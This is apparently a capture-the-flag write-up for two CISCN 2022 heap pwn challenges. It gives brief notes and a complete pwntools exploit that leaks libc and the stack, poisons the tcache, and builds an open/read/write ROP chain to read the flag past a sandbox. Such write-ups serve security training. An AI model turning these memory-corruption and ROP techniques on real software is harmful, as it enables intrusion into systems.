---
title: 【CISCN2022】 东北赛区分区赛PWN WriteUP
index_img: https://img-blog.csdnimg.cn/509bcd48db954ee2a913e5d325ac2c72.png
excerpt: ciscn2022分区赛pwn方向soil3和mountain1题解
---

## soil3 & mountain1

- 首先根据unsorted bin 泄露出libc
- 然后根据libc_base 和 `libc.bss()`函数泄露栈地址
- 利用orw ROP覆盖ret返回地址，并绕过沙盒机制
- soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过

```PYTHON
from pwn import *

io = process('./pwn')
# io = remote('172.16.30.186',58012)
# context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF('./pwn')


def add(size,content):
    io.recvuntil('Choice:')
    io.sendline('1')
    io.recvuntil('Please input size:')
    io.sendline(str(size))
    io.recvuntil('Please input content:')
    io.send(content)

def free(idx):
    io.recvuntil('Choice:')
    io.sendline('2')
    io.recvuntil('Please input idx:')
    io.sendline(str(idx))

def show(idx):
    io.recvuntil('Choice:')
    io.sendline('3')
    io.recvuntil('Please input idx:')
    io.sendline(str(idx))

def edit(idx,content):
    io.recvuntil('Choice:')
    io.sendline('4')
    io.recvuntil('Please input idx:')
    io.sendline(str(idx))
    if idx<=32:
        io.recvuntil('Please input content:')
        io.send(content)


add(0x430,'aaaa')
add(0x430,'aaaa')
free(0)

# pause()
show(0)
# io.recvline()
# pause()
libc_base = u64(io.recvuntil('Done')[1:-4].ljust(8,b'\x00')) - libc.symbols['main_arena'] - 96
success('libc_base -->' + hex(libc_base))
bss_addr = libc_base + libc.bss()
success('bss -->'+hex(bss_addr))
flag_addr = bss_addr + 0x200
# edit(32,'')

pop_rdi = libc_base +0x000000000002daa2 #: pop rdi ; ret
pop_rsi = libc_base + 0x0000000000037bfa# : pop rsi ; ret
pop_rdx = libc_base + 0x0000000000106791# : pop rdx ; pop r12 ; ret
pop_rax = libc_base + 0x00000000000446b0# : pop rax ; ret
open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']



add(0x30,'bbbb')
free(0)
show(0)
key = u64(io.recvuntil('Done')[1:-4].ljust(8,b'\x00'))
success('key-->' + hex(key))
# pause()

edit(0,'c'*0x40)
# pause()
free(0)

edit(0,p64((bss_addr-0x10)^key))
# pause()
add(0x400,p64((bss_addr-0x10)^key))
# pause()

add(0x400,'a'*0x10)

# pause()
show(4)
io.recvuntil('a'*0x10)
stack = u64(io.recv(6).ljust(8,b'\x00'))
ret = stack-0x148
success('stack_addr -->' +hex(stack-0x8))
success('ret-->'+hex(ret))
# free(1)
add(0x30,'aaaa')
add(0x30,'aaaa')
free(5)
edit(5,'a'*0x40)
free(5)
edit(5,p64((ret)^key))
# pause()
add(0x400,p64((ret)^key))
pause()
orw = b'./flag\x00\x00'
orw += p64(pop_rdi)
orw += p64(ret)
orw += p64(pop_rsi)
orw += p64(0)
orw += p64(pop_rdx)
orw += p64(0)
orw += p64(0)
orw += p64(open_addr)


##read
orw += p64(pop_rdi)
orw += p64(3)
orw += p64(pop_rsi)
orw += p64(flag_addr)
orw += p64(pop_rdx)
orw += p64(0x100)
orw += p64(0)
orw += p64(read_addr)

##write
orw += p64(pop_rdi)
orw += p64(1)
orw += p64(pop_rsi)
orw += p64(flag_addr)
orw += p64(pop_rdx)
orw += p64(0x100)
orw += p64(0)
orw += p64(write_addr)
add(0x400,orw)

io.interactive()
```